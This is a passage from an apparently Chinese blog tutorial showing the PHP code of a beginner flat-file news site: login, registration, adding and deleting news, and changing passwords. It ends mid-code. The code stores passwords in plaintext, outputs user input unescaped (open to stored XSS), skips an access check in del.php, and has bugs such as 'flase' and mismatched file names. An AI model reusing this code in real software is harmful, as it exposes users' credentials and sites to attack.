&lt;td&gt;$hot&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$author&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;$date&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">        //新闻前三个显示图片和简介  </span><br><span class="line">        if($top3Cnt&lt;=3)&#123;</span><br><span class="line">            $tmpContent = mb_substr(base64_decode($data[2]), 0,50);</span><br><span class="line">            echo &lt;&lt;&lt;EOF</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;td&gt;&lt;img src=&quot;$imgUrl&quot; height=&quot;80&quot; width=&quot;80&quot;&gt;&lt;/td&gt;</span><br><span class="line">                &lt;td colspan=&apos;4&apos;&gt;&lt;b&gt;内容简介：&lt;/b&gt;$tmpContent&lt;/td&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">        &#125;</span><br><span class="line">        $top3Cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>普通用户显示界面：</p><p><img src="/images/iniPic.png" alt></p><p>管理员用户显示界面：</p><p><img src="/images/adminIniPic.png" alt></p><h3 id="三、用户登录和用户注册"><a href="#三、用户登录和用户注册" class="headerlink" title="三、用户登录和用户注册"></a>三、用户登录和用户注册</h3><h4 id="1-login-html"><a href="#1-login-html" class="headerlink" title="1.login.html"></a>1.login.html</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;登录页面&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/login.css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;box&quot;&gt; </span><br><span class="line">    &lt;div class=&quot;top&quot;&gt;</span><br><span class="line">        &lt;h1&gt;登录&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;form action=&quot;checklogin.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;手机号/邮箱/用户名&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;密码&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input class=&quot;input_code&quot; type=&quot;text&quot; name=&quot;verifycode&quot; placeholder=&quot;验证码&quot;&gt;</span><br><span class="line">        &lt;img class=&quot;verifycode&quot; src=&quot;https://passport.360.cn/captcha.php?m=create&amp;app=i360&amp;scene=login&amp;userip=&amp;level=default&amp;sign=8820a4&amp;r=1564540365&amp;border=none&amp;_=1564540365972&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;a class=&quot;signup&quot; href=&quot;logup.html&quot;&gt;注册账号&lt;/a&gt;</span><br><span class="line">        &lt;a class=&quot;getpass&quot; href=&quot;./tmp/getpasswd.php&quot;&gt;忘记密码&lt;/a&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input class=&quot;login&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="2-checklogin-php"><a href="#2-checklogin-php" class="headerlink" title="2.checklogin.php"></a>2.checklogin.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;</span><br><span class="line">        登录</span><br><span class="line">    &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$fhandle = fopen(&apos;./data/users.db&apos;, &apos;r&apos;);</span><br><span class="line">while(!feof($fhandle)) &#123;</span><br><span class="line">    $InMes = fgets($fhandle);</span><br><span class="line">    $mesArray = explode(&apos;||&apos;, $InMes);</span><br><span class="line">    if(count($mesArray)!=2)&#123;</span><br><span class="line">        continue;</span><br><span class="line">    &#125;</span><br><span class="line">    if(trim($mesArray[0])==$_POST[&apos;username&apos;] &amp;&amp; trim($mesArray[1])==$_POST[&apos;password&apos;])&#123;</span><br><span class="line">        $_SESSION[&apos;uname&apos;] = $_POST[&apos;username&apos;];</span><br><span class="line">        echo &quot;正在进入后台&quot;;</span><br><span class="line">        echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;script&gt;location.href=&quot;./data/addNews.php&quot;&lt;/script&gt;</span><br><span class="line">EOF;</span><br><span class="line">        $flag=0;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    $flag = 1;</span><br><span class="line">&#125;</span><br><span class="line">if($flag==1)&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;账号或密码错误！重新输入。&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>登录成功界面：</p><p><img src="/images/loginSec.png" alt></p><p>登录失败界面：</p><p><img src="/images/loginFail.png" alt></p><h4 id="3-checklogup-php"><a href="#3-checklogup-php" class="headerlink" title="3. checklogup.php"></a>3. checklogup.php</h4><p><code>logup.html</code>与<code>login.html</code>程序接近</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$fhandle = fopen(&apos;./data/users.db&apos;, &apos;a+&apos;);</span><br><span class="line">$userMes = array();</span><br><span class="line">$storeMes = array();</span><br><span class="line">@$userMes[0] = $_POST[&apos;username&apos;];</span><br><span class="line">@$userMes[1]=$_POST[&apos;password&apos;];</span><br><span class="line">@$userMes[2]=$_POST[&apos;checkpasswd&apos;];</span><br><span class="line">if(strcmp($userMes[1], $userMes[2])!=0)&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&apos;两次输出密码不同！请重新输入！&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;script&gt;history.back()&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    $storeMes[0] = $userMes[0];</span><br><span class="line">    $storeMes[1] = $userMes[1];</span><br><span class="line">    $inMes = implode(&apos;||&apos;, $storeMes);</span><br><span class="line">    if (count($userMes) == 3) &#123;</span><br><span class="line">        fputs($fhandle, $inMes . &quot;\n&quot;);</span><br><span class="line">        fclose($fhandle);</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;用户注册成功&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;script&gt;location.href=&apos;login.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">        $_SESSION[&apos;uname&apos;] = $_POST[&apos;username&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>用户注册失败：</p><p><img src="/images/logupFail.png" alt></p><p>用户注册成功：</p><p><img src="/images/logupSec.png" alt></p><h3 id="四、新闻的增删改查"><a href="#四、新闻的增删改查" class="headerlink" title="四、新闻的增删改查"></a>四、新闻的增删改查</h3><h4 id="1-添加新闻-addNews-php"><a href="#1-添加新闻-addNews-php" class="headerlink" title="1. 添加新闻 addNews.php"></a>1. 添加新闻 addNews.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--添加头部信息--&gt;</span><br><span class="line">&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt;</span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        if($_SESSION[&apos;uname&apos;]==NULL) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">            die(&quot;请登录&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;a href=&quot;upload.php&quot;&gt;上传头像&lt;/a&gt;       &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">    &lt;a href=&quot;del.php&quot;&gt;删除新闻&lt;/a&gt;      &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">    &lt;a href=&quot;getpasswd.php&quot;&gt;修改密码&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;form action=&quot;addNews.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            if($_SESSION[&apos;uname&apos;]==NULL)</span><br><span class="line">                echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">                die(&quot;请登录&quot;);</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;title&quot; placeholder=&quot;文章标题&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;number&quot; name=&quot;hot&quot; placeholder=&quot;热度&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;imgUrl&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;textarea name=&quot;content&quot; cols=&quot;100&quot; rows=&quot;50&quot; placeholder=&quot;文章内容&quot;&gt;&lt;/textarea&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    $fhandle = fopen(&apos;../data/news2.db&apos;, &apos;a&apos;);</span><br><span class="line">    $t = time();</span><br><span class="line">    $arrMes = array();</span><br><span class="line">    @$arrMes[0] = computerId(&apos;../data/news2.db&apos;)+1;</span><br><span class="line">    @$arrMes[1] = base64_encode($_POST[&apos;title&apos;]);</span><br><span class="line">    @$arrMes[2] = base64_encode($_POST[&apos;content&apos;]);</span><br><span class="line">    @$arrMes[3] = date(&quot;Y-m-d&quot;, $t);</span><br><span class="line">    @$arrMes[4] = base64_encode($_SESSION[&quot;username&quot;]);</span><br><span class="line">    @$arrMes[5] = $_POST[&apos;hot&apos;];</span><br><span class="line">    @$arrMes[6] = $_POST[&apos;imgUrl&apos;];</span><br><span class="line">    if (count($arrMes) == 7) &#123;</span><br><span class="line">        $writeMes = implode(&apos;||&apos;, $arrMes);</span><br><span class="line">        $fline = fputs($fhandle, $writeMes.&quot;\n&quot;);</span><br><span class="line">        if ($fline != flase) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(\&quot;新闻添加成功！\&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;a href=&apos;../index.php&apos;&gt;点击查看&lt;/a&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fhandle);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!--添加尾部信息--&gt;</span><br><span class="line">&lt;?php include &quot;../basedir/footer.php&quot;;?&gt;</span><br></pre></td></tr></table></figure><p>添加新闻页面：</p><p><img src="/images/testAddNews.png" alt></p><p><img src="/images/addNewsOk.png" alt></p><h4 id="2-删除新闻-del-php"><a href="#2-删除新闻-del-php" class="headerlink" title="2. 删除新闻 del.php"></a>2. 删除新闻 del.php</h4><p>思路：每条新闻对应一个<code>id</code>号，通过输入<code>id</code>判断要删除的新闻，程序循环读取文件每一行数据，再通过字符串函数把<code>id</code>号取出，若<code>id</code>不匹配把每行数据<code>push</code>到一个数组里面，若相等则跳过。然后再通过<code>for</code>循环把存入数据的数组以<code>w</code>格式重新写入文件即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    if($_SESSION[&apos;uname&apos;]==NULL)</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;div align=&quot;center&quot;&gt;</span><br><span class="line">        &lt;a href=&quot;upload.php&quot;&gt;上传头像&lt;/a&gt;       &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">        &lt;a href=&quot;../data/addNews.php&quot;&gt;添加新闻&lt;/a&gt;      &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">        &lt;a href=&quot;getpasswd.php&quot;&gt;修改密码&lt;/a&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        &lt;form action=&quot;del.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;id&quot; placeholder=&quot;请输入要删除文章的编号&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;a href=&quot;../index.php&quot; target=&quot;_blank&quot;&gt;点击查看&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;table align=&quot;center&quot;&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;标号&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;作者&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            $f = fopen(&apos;../data/news1.db&apos;, &apos;r&apos;);</span><br><span class="line">            while(!feof($f))&#123;</span><br><span class="line">                $fline = fgets($f);</span><br><span class="line">                $data = explode(&apos;||&apos;, $fline);</span><br><span class="line">                @$artId = $data[0];</span><br><span class="line">                @$title = base64_decode($data[1]);</span><br><span class="line">                @$author = base64_decode($data[4]);</span><br><span class="line">                echo &lt;&lt;&lt;EOF</span><br><span class="line">                &lt;tr align=&quot;center&quot;&gt;</span><br><span class="line">                    &lt;td&gt;$artId&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;$title&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;$author&lt;/td&gt; </span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">EOF;</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    @$id = $_POST[&apos;id&apos;];</span><br><span class="line">    $fhandle = fopen(&apos;../data/news1.db&apos;, &apos;r&apos;);</span><br><span class="line">    $transArr = array();</span><br><span class="line">    while(!feof($fhandle))&#123;</span><br><span class="line">        $fline = fgets($fhandle);</span><br><span class="line">        $tmpLine = explode(&apos;||&apos;, $fline);</span><br><span class="line">        if($tmpLine[0] == $id)&#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        array_push($transArr, $tmpLine);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fhandle);</span><br><span class="line">    for($i=0; $i&lt;count($transArr); $i++) &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $fhandle = fopen(&apos;../data/news1.db&apos;, &apos;w&apos;);</span><br><span class="line">    for($i=0; $i&lt;count($transArr); $i++) &#123;</span><br><span class="line">        if(count($transArr[$i])==7) &#123;</span><br><span class="line">            $transArr[$i][0] = $i + 1;</span><br><span class="line">            $str = implode(&apos;||&apos;, $transArr[$i]);</span><br><span class="line">            if($str==&quot;\n&quot;)&#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            fputs($fhandle, $str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($_POST[&apos;id&apos;])) &#123;</span><br><span class="line">        if (count($transArr) == computerId(&apos;../data/news1.db&apos;)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;删除成功&apos;); location.href=&apos;../tmp/del.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fhandle);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php include &quot;../basedir/footer.php&quot;;?&gt;</span><br></pre></td></tr></table></figure><p>添加好新闻后，点击删除新闻可以进入删除新闻界面</p><p><img src="/images/delShow.png" alt></p><p><img src="/images/delIn.png" alt></p><p><img src="/images/del7.png" alt></p><p><img src="/images/delSecShow.png" alt></p><h4 id="3-修改密码"><a href="#3-修改密码" class="headerlink" title="3. 修改密码"></a>3. 修改密码</h4><p><code>getpasswd.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include &apos;../basedir/header.php&apos;; include &apos;../basedir/function.php&apos;;?&gt;</span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    if($_SESSION[&apos;uname&apos;]==NULL) &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">        die(&quot;请登录&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">    &lt;a href=&quot;upload.php&quot;&gt;上传头像&lt;/a&gt;       &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">    &lt;a href=&quot;../data/addNews.php&quot;&gt;添加新闻&lt;/a&gt;      &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp  &amp;nbsp</span><br><span class="line">    &lt;a href=&quot;del.php&quot;&gt;删除新闻&lt;/a&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;form action=&quot;checkpass.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;label&gt;输入旧密码：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;oldpasswd&quot;&gt;</span><br><span class="line">        &lt;label&gt;输入新密码：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;newpasswd&quot;&gt;</span><br><span class="line">        &lt;label&gt;确认密码：&lt;/label&gt;&lt;input type=&quot;text&quot; name=&quot;checknewpasswd&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;?php include &quot;../basedir/footer.php&quot;;?&gt;</span><br></pre></td></tr></table></figure><p><code>checkpass.php</code></p><p>思路：先把每行数据读出存到一个数组里，用户名匹配成功后，先判断<code>oldpass</code>是否正确，不正确则返回，重新输入，若匹配成功，再判断<code>newpasswd</code>和<code>checknewpasswd</code>是否一致，不一致返回，重新输入，一致的话，把该用户的密码改成新密码后入栈。最后处理完的数据写入文件中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">    if($_SESSION[&apos;uname&apos;]==NULL) &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&apos;请登录&apos;); location.href=&apos;../login.html&apos;&lt;/script&gt;&quot;;</span><br><span class="line">        die(&quot;请登录&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if($_POST[&apos;oldpasswd&apos;]==NULL &amp;&amp; $_POST[&apos;newpasswd&apos;]==NULL &amp;&amp; $_POST[&apos;checknewpasswd&apos;]==NULL)&#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(\&quot;密码不能为空\&quot;); history.back();&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $tmparr = array();</span><br><span class="line">    $userPasswd = array();</span><br><span class="line">    $oldpass = $_POST[&apos;oldpasswd&apos;];</span><br><span class="line">    $newpass = $_POST[&apos;newpasswd&apos;];</span><br><span class="line">    $checknew = $_POST[&apos;checknewpasswd&apos;];</span><br><span class="line">    $fhandle = fopen(&apos;../data/user1.db&apos;, &apos;r&apos;);</span><br><span class="line">    while(!feof($fhandle)) &#123;</span><br><span class="line">        $line = fgets($fhandle);</span><br><span class="line">        $lineArr = explode(&apos;||&apos;, $line);</span><br><span class="line">        if ($lineArr[0] == $_SESSION[&apos;uname&apos;]) &#123;</span><br><span class="line">            $userPasswd[0] = $lineArr[0];</span><br><span class="line">            $userPasswd[1] = $newpass.&quot;\n&quot;;</span><br><span class="line">            $checkold = $lineArr[1];</span><br><span class="line">            array_push($tmparr, $userPasswd);</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        array_push($tmparr, $lineArr);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fhandle);</span><br><span class="line">    if(trim($checkold)!=$oldpass)&#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(\&quot;密码不正确！\&quot;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        if ($newpass == $checknew) &#123;</span><br><span class="line">            $fhandle = fopen(&apos;../data/user1.db&apos;, w);</span><br><span class="line">            for ($i = 0; $i &lt; count($tmparr); $i++) &#123;</span><br><span class="line">                $str = implode(&apos;||&apos;, $tmparr[$i]);</span><br><span class="line">                echo $str;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                fputs($fhandle, $str);</span><br><span class="line">            &#125;</span><br><span class="line">            fclose($fhandle);</span><br><span class="line">            echo 